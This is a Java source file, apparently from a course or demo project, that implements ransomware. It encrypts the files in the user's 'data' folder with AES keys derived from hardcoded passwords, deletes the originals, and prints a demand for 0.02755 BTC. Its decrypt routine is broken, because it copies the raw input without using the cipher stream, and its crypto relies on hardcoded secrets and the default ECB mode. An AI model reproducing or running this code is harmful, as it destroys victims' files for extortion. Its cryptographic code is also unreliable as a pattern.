import javax.crypto.*;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.MessageDigest;
import java.security.spec.KeySpec;

public class AES256{

    public Port port;

    private static final AES256 instance = new AES256();

    private AES256(){
        this.port = new Port();
    }

    public static AES256 getInstance() {
        return instance;
    }

    private static final String password_1 = "4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s";
    private static final String password_2 = "r9s2k4m5n7q8r9t2j3k4n6p7q9s2j3m5n6p8r9s3k4m5p7q8r2j3k4n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m54m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9sp7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5";


    private void crypto(int cryptoMode, File inputFile, File outputFile){
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");

            byte[] encoded_password_1 = digest.digest(password_1.getBytes());
            String hash_password_1 = bytesToHex(encoded_password_1);

            byte[] encoded_password_2 = digest.digest(password_2.getBytes());
            String hash_password_2 = bytesToHex(encoded_password_2);

            FileInputStream fileInputStream = new FileInputStream(inputFile);
            FileOutputStream fileOutputStream = new FileOutputStream(outputFile);

            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            KeySpec spec = new PBEKeySpec(hash_password_1.toCharArray(), hash_password_2.getBytes(), 65536, 256);

            SecretKey sKey = factory.generateSecret(spec);
            SecretKeySpec secretKey = new SecretKeySpec(sKey.getEncoded(), "AES");
            Cipher cipher = Cipher.getInstance("AES");

            if(cryptoMode == Cipher.ENCRYPT_MODE){

                cipher.init(Cipher.ENCRYPT_MODE, secretKey);
                CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, cipher);
                write(cipherInputStream, fileOutputStream);

            }else if(cryptoMode == Cipher.DECRYPT_MODE){
                cipher.init(Cipher.DECRYPT_MODE, secretKey);
                CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, cipher);
                write(fileInputStream, fileOutputStream);
            }

            fileInputStream.close();
            fileOutputStream.close();


        }catch (Exception e){
            e.printStackTrace();
        }
    }


    public void write(InputStream inputStream, OutputStream outputStream) throws IOException {

        byte[] bufferArray = new byte[64];
        int input;

        while ((input = inputStream.read(bufferArray)) != -1){
            outputStream.write(bufferArray, 0, input);
        }

        outputStream.close();
        inputStream.close();



    }

    private static String bytesToHex(byte[] hash){
        StringBuilder hexString = new StringBuilder(2 * hash.length);

        for(int i = 0; i < hash.length; i++){
            String hex = Integer.toHexString(0xff & hash[i]);
            if(hex.length() == 1){
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();

    }


    public class Port implements IAES256{

        private static final File f = new File(Configuration.instance.userDirectory + Configuration.instance.fileSeperator + "data");

        @Override
        public void encrypt() {

            AllowedData.resetList();
            File[] files = f.listFiles();

            if(files != null){
                for (File file : files){
                    if(AllowedData.AllowedDataEncode(file)){
                        try{
                            File encrypted = new File(file.toString().concat(".mcg"));
                            crypto(Cipher.ENCRYPT_MODE, file, encrypted);
                            //System.out.println("Encryption Completed!");
                        }catch (Exception e){
                            e.printStackTrace();
                        }

                        try{
                            if(file.delete()){
                                //System.out.println(file + " has been deleted");
                            }else{
                                //System.out.println(file + " failed deleting");
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }
                }
                System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
            }else {
                System.out.println("NO FILES FOUND TO ENCRYPT. YOU ARE LUCKY");
            }
        }

        @Override
        public void decrypt() {

            AllowedData.resetList();
            File[] files = f.listFiles();

            if(files != null){
                for(File file : files){
                    if(AllowedData.AllowedDataDecode(file)){
                        if(file.toString().indexOf(".") > 0){
                            String fileWithoutExt = file.toString().substring(0, file.toString().lastIndexOf("."));
                            try{
                                File decrypted = new File(fileWithoutExt);
                                crypto(Cipher.DECRYPT_MODE, file, decrypted);
                                //System.out.println("Decryption Completed!");
                            }catch (Exception e){
                                e.printStackTrace();
                            }

                            try{
                                if(file.delete()){
                                    //System.out.println(file + " has been deleted");
                                }else{
                                    //System.out.println(file + " failed deleting");
                                }
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
            System.out.println("Your Files were Decrypted!!");
        }
    }
}
